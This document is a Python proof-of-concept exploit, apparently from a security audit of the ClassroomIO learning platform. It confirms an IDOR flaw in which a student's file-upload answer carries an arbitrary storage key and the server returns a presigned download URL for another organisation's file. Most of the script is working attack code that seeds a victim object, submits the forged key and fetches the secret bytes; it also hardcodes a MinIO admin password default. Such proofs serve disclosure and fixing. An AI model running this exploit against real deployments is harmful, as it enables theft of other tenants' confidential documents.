#!/usr/bin/env python3
"""
VULN-012 (F-07) — Submission file-answer IDOR: a presigned download is minted for
ANY client-supplied `fileKey`, with no ownership check.

Vulnerable code (targets/classroomio/):
  * service: apps/api/src/services/submission/submission.ts:175-206
             enrichFileUploadAnswersArray() -> generateDocumentDownloadPresignedUrls(fileKeys)
             where fileKeys come verbatim from answer.answerData.fileKey
  * codec:   packages/question-types/src/answer-codecs.ts:173-188
             FILE_UPLOAD fromApiPayload() copies p.fileKey straight out of the client JSON
  * presign: packages/core/src/utils/s3.ts:55-129 (signs a GET for whatever key it is handed)
  * reachable via: routes/course/exercise.ts:284-316 (submit) then :78-90 (list submissions)
  * the correct guard findUnauthorizedDownloadKeys (presign-auth.ts:58-87) is NOT applied here.

Class: CWE-639 IDOR (object-storage presign of arbitrary keys).

The flaw: when a student submits a FILE_UPLOAD answer, the storage key is taken verbatim
from the request body and persisted. When submissions are listed, the server mints a
presigned GET for that key with zero check that the key was ever issued to this user
(or belongs to their org). A student can therefore submit an answer whose `fileKey`
points at ANY object in the `documents` bucket and receive a working download URL.

Exploitation idea: seed a victim object under a foreign org prefix, submit an exercise
answer referencing its key, then read the submissions overview and fetch the returned
`fileUrl`.

Success proof: the attacker downloads the exact secret bytes of an object they never
uploaded and were never entitled to, via a presigned URL the server minted from their
attacker-controlled `fileKey`.
"""
import json
import os
import subprocess
import sys

import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (  # noqa: E402
    admin_login, make_student, create_course, log, banner, verdict, rid, ORG_ID,
)

VULN = "VULN-012"
HERE = os.path.dirname(os.path.abspath(__file__))
FILE_UPLOAD = 8  # question type id

MINIO_CONTAINER = os.environ.get("MINIO_CONTAINER", "cio-minio")
MC = "/opt/bitnami/minio-client/bin/mc"
MINIO_USER = os.environ.get("MINIO_USER", "minioadmin")
MINIO_PASS = os.environ.get("MINIO_PASS", "a126ecd8a88a9f07f02b0facb2019b30")


def mc_put(bucket, key, content: bytes):
    """Seed an object directly into MinIO (simulates a victim/other-tenant object the
    attacker has no entitlement to). Uses the admin mc client inside the minio container."""
    subprocess.run(["docker", "exec", "-i", MINIO_CONTAINER, MC, "alias", "set", "cioseed",
                    "http://127.0.0.1:9000", MINIO_USER, MINIO_PASS],
                   check=True, capture_output=True)
    subprocess.run(["docker", "exec", "-i", MINIO_CONTAINER, MC, "pipe", f"cioseed/{bucket}/{key}"],
                   input=content, check=True, capture_output=True)


def create_file_exercise(admin, course_id, title):
    r = admin.post(f"/course/{course_id}/exercise", org=True, json={
        "title": title, "order": 1, "courseId": course_id,
        "questions": [{"question": f"Upload your file {rid('q')}", "questionTypeId": FILE_UPLOAD, "points": 10}],
    })
    if r.status_code not in (200, 201):
        raise RuntimeError(f"create exercise failed: {r.status_code} {r.text[:300]}")
    data = r.json().get("data", {})
    ex_id = data.get("id") or data.get("exercise", {}).get("id")
    qid = None
    for q in (data.get("questions") or []):
        qid = q.get("id"); break
    return ex_id, qid


def find_file_url(overview, file_key):
    for bucket in ("mySubmission", "allSubmissions"):
        for sub in (overview.get(bucket) or []):
            for ans in (sub.get("answers") or []):
                ad = ans.get("answerData") or {}
                if ad.get("fileKey") == file_key and ad.get("fileUrl"):
                    return ad["fileUrl"]
    return None


def main():
    banner(VULN, "Submission file-answer presign IDOR (presigned download of any client-supplied fileKey)")
    log("INFO", "enrichFileUploadAnswersArray (submission.ts:175-206) presigns answerData.fileKey verbatim")
    log("INFO", "no ownership/per-submitter check; findUnauthorizedDownloadKeys is not wired into this path")

    admin = admin_login()
    course = create_course(admin, title=f"FileExfil {rid('c')}")
    ex_id, qid = create_file_exercise(admin, course["id"], f"FileUp {rid('ex')}")
    log("SETUP", f"course={course['id']} exercise={ex_id} fileQuestion={qid}")

    # Seed a victim object under a DIFFERENT (foreign) org prefix — an object the attacker
    # never uploaded and has no entitlement to (cross-tenant given a known key in cloud).
    victim_org = "11111111-1111-4111-8111-111111111111"
    secret = f"%PDF-1.4 CONFIDENTIAL-VICTIM-DOCUMENT {rid('secret')} do-not-share"
    victim_key = f"{victim_org}/{rid('lecture')}-payroll.pdf"
    mc_put("documents", victim_key, secret.encode())
    log("SETUP", f"seeded victim object: documents/{victim_key}  (marker embedded)")

    attacker, ainfo = make_student(admin, course_id=course["id"])
    log("SETUP", f"attacker student {ainfo['user_id']} enrolled in the course (never uploaded that object)")

    # Attacker submits a FILE_UPLOAD answer whose fileKey is the victim's key.
    answer_json = json.dumps({"fileKey": victim_key, "fileName": "my-homework.pdf",
                              "mimeType": "application/pdf", "size": len(secret)})
    submit_body = {"exerciseId": ex_id, "answers": [{"questionId": qid, "answer": answer_json}]}
    log("STEP", f"attacker POST /course/{course['id']}/exercise/{ex_id}/submission  fileKey=<victim documents key>")
    rs = attacker.post(f"/course/{course['id']}/exercise/{ex_id}/submission", org=True, json=submit_body)
    log("INFO", f"  submit -> HTTP {rs.status_code} {rs.text[:120]}")

    # Attacker reads the submissions overview -> server mints a presigned GET for the victim key.
    log("STEP", f"attacker GET /course/{course['id']}/exercise/{ex_id}/submissions")
    ro = attacker.get(f"/course/{course['id']}/exercise/{ex_id}/submissions", org=True)
    overview = ro.json().get("data", {}) if ro.status_code == 200 else {}
    file_url = find_file_url(overview, victim_key)
    log("INFO", f"  minted fileUrl present: {bool(file_url)}")

    # Fetch the presigned URL -> the victim's bytes.
    downloaded = ""
    dl_status = None
    if file_url:
        log("STEP", f"attacker GET {file_url.split('?')[0]}?<presigned>")
        dr = requests.get(file_url, timeout=30)
        dl_status = dr.status_code
        downloaded = dr.text
        log("INFO", f"  download -> HTTP {dl_status}, {len(dr.content)} bytes")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(f"### 1) submit a FILE_UPLOAD answer referencing an arbitrary storage key\n"
                f"POST http://localhost:21527/course/{course['id']}/exercise/{ex_id}/submission HTTP/1.1\n"
                f"Content-Type: application/json\ncio-org-id: {ORG_ID}\n"
                f"Cookie: classroomio.session_token=<attacker student session>\n\n"
                f"{json.dumps(submit_body)}\n\n"
                f"### 2) read submissions -> answerData.fileUrl is a presigned GET for that key\n"
                f"GET http://localhost:21527/course/{course['id']}/exercise/{ex_id}/submissions HTTP/1.1\n\n"
                f"### 3) fetch fileUrl -> the victim object's bytes\n"
                f"GET {file_url or '<fileUrl>'}\n")
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"submit -> HTTP {rs.status_code}\n")
        f.write(f"overview minted fileUrl: {file_url}\n\n")
        f.write(f"download -> HTTP {dl_status}\n")
        f.write(f"downloaded body: {downloaded[:400]}\n\n")
        f.write(f"seeded secret : {secret}\n")

    if file_url and dl_status == 200 and secret in downloaded:
        log("PROOF", f"attacker downloaded the exact seeded secret of documents/{victim_key} "
                     f"(a foreign object they never uploaded) via a presigned URL the server minted "
                     f"from their own attacker-supplied fileKey")
        verdict(VULN, "CONFIRMED", "arbitrary fileKey in a submission answer yields a working presigned download")
        log("OK", "exploit confirmed — object-storage IDOR via unvalidated submission fileKey")
        sys.exit(0)

    verdict(VULN, "FAILED", f"fileUrl={bool(file_url)} dl={dl_status} marker={secret in downloaded}")
    log("FAIL", "did not obtain the victim object's bytes")
    sys.exit(1)


if __name__ == "__main__":
    main()
